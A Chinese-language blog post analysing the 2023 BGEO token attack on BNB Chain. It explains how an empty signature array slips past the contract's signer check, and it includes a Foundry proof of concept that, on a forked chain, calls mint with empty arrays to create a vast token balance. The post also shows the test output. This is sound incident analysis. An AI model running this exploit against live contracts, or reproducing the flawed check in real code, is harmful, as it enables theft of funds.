---
title: "Binance BGEO Attack Analysis"
date: 2023-04-28T08:43:45+08:00
draft: false
author: yinhui
categories: [security]
tags: [defi] 
---

参数检查不严格的锅

<!--more-->

## 漏洞分析

攻击发生在https://bscscan.com/tx/0x9f4ef3cc55b016ea6b867807a09f80d1b2e36f6cd6fccfaf0182f46060332c57

被攻击合约: [0xc342774492b54ce5F8ac662113ED702Fc1b34972](https://bscscan.com/address/0xc342774492b54ce5F8ac662113ED702Fc1b34972#code)

合约的`mint`定义如下:

```solidity
    function mint(
        uint256 _amount,
        string memory _txHash,
        address _receiver,
        bytes32[] memory _r,
        bytes32[] memory _s,
        uint8[] memory _v
    ) external isSigned(_txHash, _amount, _r, _s, _v) returns (bool) {
        require(!txHashes[_txHash], "tx-hash-used");
        txHashes[_txHash] = true;

        _mint(_receiver, _amount);
        return true;
    }
```

其中的`_mint()`如下:

```solidity
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

```

在`mint()`函数执行了2个检查, 通过检查便可调用`_mint()`增加msg.sender的余额

1. 检查1: 

   ```solidity
   require(!txHashes[_txHash], "tx-hash-used");
           txHashes[_txHash] = true;
   ```

   检查传入的_txHash是否被使用过, 避免同一个__txHash被使用多次.

2. 检查2:

   ```solidity
   isSigned(_txHash, _amount, _r, _s, _v)
   ```

   这是一个modifier, 用于检查 \_txHash和\_amout传入参数是否被正确签名:

   ```solidity
       modifier isSigned(
           string memory _txHash,
           uint256 _amount,
           bytes32[] memory _r,
           bytes32[] memory _s,
           uint8[] memory _v
       ) {
           require(checkSignParams(_r, _s, _v), "bad-sign-params");
           bytes32 _hash = keccak256(
               abi.encodePacked(bsc, msg.sender, _txHash, _amount)
           );
           address[] memory _signers = new address[](_r.length);
           for (uint8 i = 0; i < _r.length; i++) {
               _signers[i] = ecrecover(_hash, _v[i], _r[i], _s[i]);
           }
   
           require(isSigners(_signers), "bad-signers");
           _;
       }
       
      function isSigners(address[] memory _signers) public view returns (bool) {
           for (uint8 i = 0; i < _signers.length; i++) {
               if (!_containsSigner(_signers[i])) {
                   return false;
               }
           }
           return true;
       }
       function checkSignParams(
           bytes32[] memory _r,
           bytes32[] memory _s,
           uint8[] memory _v
       ) private view returns (bool) {
           return (_r.length == _s.length) && (_s.length == _v.length);
       }
   ```

   从上面的代码可以看出, 验证签名的逻辑如下:
   对于参数\_txHash和\_amount, 有一组椭圆曲线签名对应的(r, s, v), 通过`ecrecover`函数恢复出签名者的公钥(地址), 并检查签名地址是否包含在预定于的合法签名者列表中(可以理解为白名单)

   可以将代码简化为:

   ```python
   def isSigned(message, r[],s[],v[]){
   		allSigners = recovery_signer_addresses_from_r_s_v_array();
   		for (s in allSigners){
   			if (s not in whiteList){
   				return false;
   			}
   		}
   		return true
   }
   ```

   这里有两个问题需要注意: 一是默认返回不应该为true, 而应该默认返回false.  二是没有注意数组可能为空, 但数组长度为0时, 代码直接返回true了, 这就绕过了`isSigned`

   ```solidity
      function isSigners(address[] memory _signers) public view returns (bool) {
           // 问题出在这里： 传入的数组为空时，长度为0， 直接返回true了
           for (uint8 i = 0; i < _signers.length; i++) {
               if (!_containsSigner(_signers[i])) {
                   return false;
               }
           }
           return true;
       }
   ```

   



## POC

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBGEO20 {
    function balanceOf(address account) external view returns (uint256);

    function decimals() external view returns (uint8);

    function mint(
        uint256 _amount,
        string memory _txHash,
        address _receiver,
        bytes32[] memory _r,
        bytes32[] memory _s,
        uint8[] memory _v
    ) external returns (bool);
}


IBGEO20 constant BGEO = IBGEO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);

contract Hack is Test {
    function setUp() public {
        vm.createSelectFork("theNet", 22315679); //BSC
    }

    function testPoc() public {
        BGEO.mint(
            99999999999999999 * 10 ** 18,
            "abcdefg",
            address(this),
            new bytes32[](0),
            new bytes32[](0),
            new uint8[](0)
        );

        emit log_named_decimal_uint(
            "BGEO i have",
            BGEO.balanceOf(address(this)),
            BGEO.decimals()
        );
    }
}

```

输出:

```
[PASS] testPoc() (gas: 64559)
Logs:
  BGEO i have: 99999999999999999.000000000000000000
```

​     

